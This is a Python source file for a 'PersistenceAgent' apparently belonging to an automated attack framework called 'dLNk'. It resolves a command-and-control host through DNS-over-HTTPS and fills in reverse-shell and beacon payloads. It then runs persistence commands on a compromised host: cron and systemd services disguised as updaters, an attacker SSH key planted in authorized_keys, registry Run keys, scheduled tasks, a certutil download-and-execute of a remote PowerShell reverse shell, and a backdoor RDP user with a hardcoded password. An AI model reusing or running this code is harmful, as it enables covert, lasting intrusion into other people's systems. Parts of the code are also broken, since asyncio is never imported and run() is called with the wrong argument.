import logging
from core.data_models import AgentData, Strategy
import os
import random
import string
from typing import Dict, Any, Optional
from core.logger import log
from core.data_models import PersistenceReport, Strategy, AttackPhase, PostExReport, ErrorType
from core.target_model_manager import TargetModelManager
from config import settings
from core.doh_utils import resolve_doh
from core.payload_manager import PayloadManager
from core.shell_manager import ShellManager
import time

from core.base_agent import BaseAgent


class PersistenceAgent(BaseAgent):
    supported_phases = [AttackPhase.PERSISTENCE]
    required_tools = []
    """
    An agent that attempts to establish persistence on a compromised host.
    """

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.logger = logging.getLogger(self.__class__.__name__)
        self.payload_manager: Optional[PayloadManager] = None
        self.post_ex_report: Optional[PostExReport] = None
        self.shell_manager: Optional[ShellManager] = None
        self.target_model_manager: Optional[TargetModelManager] = None
        self.report_class = PersistenceReport

    async def setup(self):
        """Asynchronous setup method for PersistenceAgent."""
        self.post_ex_report = await self.context_manager.get_context('post_ex_report')
        self.shell_manager = await self.context_manager.get_context('shell_manager')
        self.target_model_manager = await self.context_manager.get_context('target_model_manager')
        self.payload_manager = await self.context_manager.get_context('payload_manager')

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute persistence agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _get_attacker_ssh_public_key(self) -> str | None:
        """Reads the attacker's public SSH key from the project root."""
        try:
            key_path = os.path.join(settings.WORKSPACE_DIR, 'vps_pub_key.pub')
            with open(key_path, 'r') as f:
                return f.read().strip()
        except FileNotFoundError:
            log.error(
                f"[PersistenceAgent] Attacker SSH public key not found at {key_path}")
            return None

    async def run(self, strategy: Strategy, **kwargs) -> PersistenceReport:
        start_time = time.time()
        shell_id = strategy.context.get("shell_id")
        if not shell_id:
            end_time = time.time()
            return PersistenceReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id="",
                persistence_type="",
                errors=["Missing shell_id in context."],
                error_type=ErrorType.CONFIGURATION,
                summary="Persistence failed: Missing shell ID."
            )

        if not self.post_ex_report or self.post_ex_report.shell_id != shell_id:
            end_time = time.time()
            return PersistenceReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                persistence_type="auto",
                errors=["PostExReport not available for this shell."],
                error_type=ErrorType.CONFIGURATION,
                summary="Persistence failed: PostExReport not available."
            )

        os_info = self.post_ex_report.os_info.lower()
        is_windows = "windows" in os_info
        is_root = self.post_ex_report.privilege_level in ["root", "administrator"]

        persistence_type = strategy.context.get("persistence_type", "auto")
        if persistence_type == "auto":
            log.info(
                "[PersistenceAgent] Auto-selecting best persistence technique...")
            if is_root:
                persistence_type = "ssh_key" if not is_windows else "scheduled_task"
            else:
                persistence_type = "profile" if not is_windows else "registry_run"
            log.info(
                f"[PersistenceAgent] Selected technique: {persistence_type}")

        log.info(
            f"[PersistenceAgent] Attempting to establish {persistence_type} persistence on shell {shell_id}.")

        c2_ip = resolve_doh(settings.C2_HOST)
        if not c2_ip:
            log.error(
                f"[PersistenceAgent] Could not resolve C2 host {settings.C2_HOST} via DoH.")
            end_time = time.time()
            return PersistenceReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                persistence_type=persistence_type,
                errors=["C2 host resolution failed."],
                error_type=ErrorType.NETWORK,
                summary="Persistence failed: C2 host resolution failed."
            )

        log.info(
            f"[PersistenceAgent] Resolved C2 host {settings.C2_HOST} to {c2_ip} via DoH.")

        payload_linux_obj = self.payload_manager.get_payload(
            "linux_reverse_shell.sh")
        payload_windows_obj = self.payload_manager.get_payload(
            "windows_beacon.ps1")

        if not payload_linux_obj or not payload_windows_obj:
            end_time = time.time()
            return PersistenceReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                persistence_type=persistence_type,
                errors=["Could not find required persistence payloads."],
                error_type=ErrorType.CONFIGURATION,
                summary="Persistence failed: Required payloads not found."
            )

        # Convert jitter float (0.0-1.0) to an integer percentage for the bash script
        jitter_percent = int(settings.C2_BOT_JITTER * 100)

        payload_linux = payload_linux_obj['content'].format(
            C2_HOST=c2_ip,
            REVERSE_SHELL_PORT=settings.REVERSE_SHELL_PORT,
            C2_BOT_SLEEP=int(settings.C2_BOT_SLEEP),
            C2_BOT_JITTER_PERCENT=jitter_percent
        )
        payload_windows = payload_windows_obj['content'].format(
            C2_HOST=c2_ip,
            REVERSE_SHELL_PORT=settings.REVERSE_SHELL_PORT,
            C2_BOT_SLEEP=settings.C2_BOT_SLEEP,
            C2_BOT_JITTER=settings.C2_BOT_JITTER
        )

        payload = payload_windows if is_windows else payload_linux

        techniques = {
            # Linux
            "cronjob": {"cmd": f'(crontab -l 2>/dev/null; echo "@reboot {payload}") | crontab -', "root_req": True, "os": "linux"},
            "ssh_key": {"cmd": f'mkdir -p ~/.ssh && echo "{self._get_attacker_ssh_public_key()}" >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys', "root_req": False, "os": "linux"},
            "systemd": {"cmd": f"echo '[Unit]\\nDescription=dLNk System Updater\\n[Service]\\nExecStart={payload}\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target' | tee /etc/systemd/system/dlnk.service && systemctl enable dlnk.service && systemctl start dlnk.service", "root_req": True, "os": "linux"},
            "bashrc": {"cmd": f"echo '{payload} &' >> ~/.bashrc", "root_req": False, "os": "linux"},
            "profile": {"cmd": f"echo '{payload} &' >> ~/.profile", "root_req": False, "os": "linux"},

            # Windows
            "registry_run": {"cmd": f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v dLNkUpdater /t REG_SZ /d "{payload}" /f', "root_req": False, "os": "windows"},
            "scheduled_task": {"cmd": f'schtasks /create /sc onlogon /tn "dLNkSystemUpdate" /tr "{payload}" /rl HIGHEST /f', "root_req": True, "os": "windows"},
            "startup_folder": {"cmd": f'echo "{payload}" > "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\dlnk.bat"', "root_req": False, "os": "windows"},
            "certutil_download": {"cmd": f'certutil.exe -urlcache -split -f http://{settings.C2_HOST}:{settings.TOOL_SERVER_PORT}/lolbas_rev.ps1 C:\\Users\\Public\\rev.ps1 && powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\rev.ps1', "root_req": False, "os": "windows"},
            "new_user_rdp": {"cmd": f'net user dlnk_temp Pa$w0rd! /add && net localgroup "Remote Desktop Users" dlnk_temp /add', "root_req": True, "os": "windows"}
        }

        technique = techniques.get(persistence_type)

        if not technique:
            end_time = time.time()
            return PersistenceReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                persistence_type=persistence_type,
                errors=[f"Unknown persistence type: {persistence_type}."],
                error_type=ErrorType.CONFIGURATION,
                summary=f"Persistence failed: Unknown technique '{persistence_type}'."
            )

        if (technique['os'] == 'linux' and is_windows) or (technique['os'] == 'windows' and not is_windows):
            end_time = time.time()
            return PersistenceReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                persistence_type=persistence_type,
                errors=[f"Technique '{persistence_type}' is not compatible with OS '{os_info}'."],
                error_type=ErrorType.CONFIGURATION,
                summary=f"Persistence failed: OS incompatibility for technique '{persistence_type}'."
            )

        if technique['root_req'] and not is_root:
            end_time = time.time()
            return PersistenceReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                persistence_type=persistence_type,
                errors=[f"Technique '{persistence_type}' requires root/admin privileges."],
                error_type=ErrorType.CONFIGURATION,
                summary=f"Persistence failed: Insufficient privileges for technique '{persistence_type}'."
            )

        command = technique['cmd']

        if persistence_type == "ssh_key" and not self._get_attacker_ssh_public_key():
            end_time = time.time()
            return PersistenceReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                persistence_type=persistence_type,
                errors=["Attacker SSH public key not available."],
                error_type=ErrorType.CONFIGURATION,
                summary="Persistence failed: Attacker SSH public key not found."
            )

        try:
            log.info(f"Executing persistence command: {command}")
            output = await self.shell_manager.send_command(shell_id, command)

            output_lower = output.lower()
            if "error" in output_lower or "command not found" in output_lower or "permission denied" in output_lower or "failed" in output_lower:
                log.error(
                    f"[PersistenceAgent] Failed to establish {persistence_type} persistence: {output.strip()}")
                end_time = time.time()
                return PersistenceReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    shell_id=shell_id,
                    persistence_type=persistence_type,
                    errors=[f"Failed: {output.strip()}"],
                    error_type=ErrorType.LOGIC,
                    summary=f"Persistence attempt for '{persistence_type}' failed during execution."
                )
            else:
                log.success(
                    f"[PersistenceAgent] Successfully attempted {persistence_type} persistence.")
                # Update the target model
                target_model = self.target_model_manager.get_target(
                    strategy.context.get("hostname"))
                if target_model:
                    target_model.persistence_established = True
                    self.target_model_manager.save_model(
                        target_model)
                end_time = time.time()
                return PersistenceReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    shell_id=shell_id,
                    persistence_type=persistence_type,
                    summary=f"Persistence command for '{persistence_type}' executed. Output: {output.strip()}"
                )
        except Exception as e:
            log.error(
                f"[PersistenceAgent] Exception during persistence attempt: {e}", exc_info=True)
            end_time = time.time()
            return PersistenceReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                persistence_type=persistence_type,
                errors=[f"Exception: {e}"],
                error_type=ErrorType.LOGIC,
                summary=f"Persistence attempt for '{persistence_type}' failed due to an exception: {e}"
            )

